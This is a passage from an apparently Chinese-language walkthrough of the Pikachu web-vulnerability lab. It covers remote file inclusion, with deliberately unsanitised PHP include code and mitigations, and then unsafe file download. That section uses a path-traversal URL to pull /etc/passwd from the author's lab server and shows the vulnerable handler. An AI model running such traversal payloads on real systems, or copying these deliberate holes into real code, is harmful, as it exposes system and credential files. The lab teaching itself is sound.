class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html1</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;allow_url_include&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$html1</span><span class="o">.=</span><span class="s2">&#34;&lt;p style=&#39;color: red&#39;&gt;warning:你的allow_url_include没有打开,请在php.ini中打开了再测试该漏洞,记得修改后,重启中间件服务!&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html2</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;allow_url_fopen&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$html2</span><span class="o">.=</span><span class="s2">&#34;&lt;p style=&#39;color: red;&#39;&gt;warning:你的allow_url_fopen没有打开,请在php.ini中打开了再测试该漏洞,重启中间件服务!&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html3</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">()</span><span class="o">&lt;=</span><span class="s1">&#39;5.3.0&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;magic_quotes_gpc&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$html3</span><span class="o">.=</span><span class="s2">&#34;&lt;p style=&#39;color: red;&#39;&gt;warning:你的magic_quotes_gpc打开了,请在php.ini中关闭了再测试该漏洞,重启中间件服务!&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//远程文件包含漏洞,需要php.ini的配置文件符合相关的配置
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s2">&#34;</span><span class="si">$filename</span><span class="s2">&#34;</span><span class="p">;</span><span class="c1">//变量传进来直接包含,没做任何的安全限制
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="漏洞防范">漏洞防范</h3>
<ul>
<li>
<p>在功能设计上尽量不要将文件包含函数对应的文件放给前端进行选择和操作</p>
</li>
<li>
<p>过滤非法参数如<code>../</code>、<code>http://</code>、<code>https://</code>等</p>
</li>
<li>
<p>配置php.ini文件</p>
<ul>
<li><code>allow_url_fopen = off</code></li>
<li><code>Allow_url_include = off</code></li>
<li><code>magic_quotes_gpc = on</code></li>
</ul>
</li>
<li>
<p>通过白名单策略，仅允许包含运行指定文件</p>
</li>
<li>
<p><em>文件包含漏洞还可以配合文件上传漏洞发挥出更大的威力，此是后话</em></p>
</li>
</ul>
<h2 id="unsafe-filedownload">Unsafe Filedownload</h2>
<h3 id="概述-6">概述</h3>
<p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞</p>
<p>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径（比如<code>../../../etc/passwd</code>），则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息（密码文件、源代码等）被下载。 所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑</p>
<p>切记：所有与前端交互的数据都是不安全的，不能掉以轻心</p>
<h3 id="unsafe-filedownload-1">Unsafe Filedownload</h3>
<p>来看到一个页面，点击人名即可下载对应的图片</p>
<p><img alt="img" src="./img/20220900-1.png"></p>
<p>右键新标签页中打开链接看看URL</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/unsafedownload/execdownload.php?filename=kb.png
</code></pre><p>发现这是一个GET请求，我们改改文件目录</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/unsafedownload/execdownload.php?filename=../../../../../../../etc/passwd
</code></pre><p><img alt="img" src="./img/2022090-11.png"></p>
<p>服务器操作系统的账号密码就被下载下来了</p>
<p>看看前后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;page-content&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;usd_main&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;width: 600px;&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">h2</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;title&#34;</span> <span class="o">&gt;</span><span class="nx">NBA</span> <span class="mi">1996</span><span class="nx">年</span>   <span class="nx">黄金一代</span><span class="o">&lt;/</span><span class="nx">h2</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;mes&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;color: #1d6fa6;&#34;</span><span class="o">&gt;</span><span class="nx">Notice</span><span class="o">:</span><span class="nx">点击球员名字即可下载头像图片！</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/kb.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=kb.png&#34;</span> <span class="o">&gt;</span><span class="nx">科比</span><span class="o">.</span><span class="nx">布莱恩特</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/ai.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=ai.png&#34;</span> <span class="o">&gt;</span><span class="nx">阿伦</span><span class="o">.</span><span class="nx">艾弗森</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/ns.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=ns.png&#34;</span> <span class="o">&gt;</span><span class="nx">史蒂夫</span><span class="o">.</span><span class="nx">纳什</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/rayal.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=rayal.png&#34;</span> <span class="o">&gt;</span><span class="nx">雷</span><span class="o">.</span><span class="nx">阿伦</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/mbl.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=mbl.png&#34;</span> <span class="o">&gt;</span><span class="nx">斯蒂芬</span><span class="o">.</span><span class="nx">马布里</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/camby.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=camby.png&#34;</span> <span class="o">&gt;</span><span class="nx">马库斯</span><span class="o">.</span><span class="nx">坎比</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/pj.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=pj.png&#34;</span> <span class="o">&gt;</span><span class="nx">斯托贾科维奇</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/bigben.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=bigben.png&#34;</span> <span class="o">&gt;</span><span class="nx">本</span><span class="o">.</span><span class="nx">华莱士</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/sks.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=sks.png&#34;</span> <span class="o">&gt;</span><span class="nx">伊尔戈斯卡斯</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/oldfish.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=oldfish.png&#34;</span> <span class="o">&gt;</span><span class="nx">德里克</span><span class="o">.</span><span class="nx">费舍尔</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/smallane.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=smallane.png&#34;</span> <span class="o">&gt;</span><span class="nx">杰梅因</span><span class="o">.</span><span class="nx">奥尼尔</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;png&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;float: left&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;download/lmx.png&#34;</span> <span class="o">/&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;execdownload.php?filename=lmx.png&#34;</span> <span class="o">&gt;</span><span class="nx">阿卜杜</span><span class="o">.</span><span class="nx">拉希姆</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/function.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// $file_name=&#34;cookie.jpg&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file_path</span><span class="o">=</span><span class="s2">&#34;download/</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//用以解决中文不能显示出来的问题
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file_path</span><span class="o">=</span><span class="nx">iconv</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span><span class="s2">&#34;gb2312&#34;</span><span class="p">,</span><span class="nv">$file_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//首先要判断给定的文件存在与否
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">skip</span><span class="p">(</span><span class="s2">&#34;你要下载的文件不存在，请重新下载&#34;</span><span class="p">,</span> <span class="s1">&#39;unsafe_down.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$fp</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file_size</span><span class="o">=</span><span class="nx">filesize</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//下载文件需要用到的头
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ob_clean</span><span class="p">();</span><span class="c1">//输出前一定要clean一下，否则图片打不开
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-type: application/octet-stream&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Accept-Ranges: bytes&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Accept-Length:&#34;</span><span class="o">.</span><span class="nv">$file_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-Disposition: attachment; filename=&#34;</span><span class="o">.</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$buffer</span><span class="o">=</span><span class="mi">1024</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file_count</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//向浏览器返回数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">//循环读取文件流,然后返回到浏览器feof确认是否到EOF
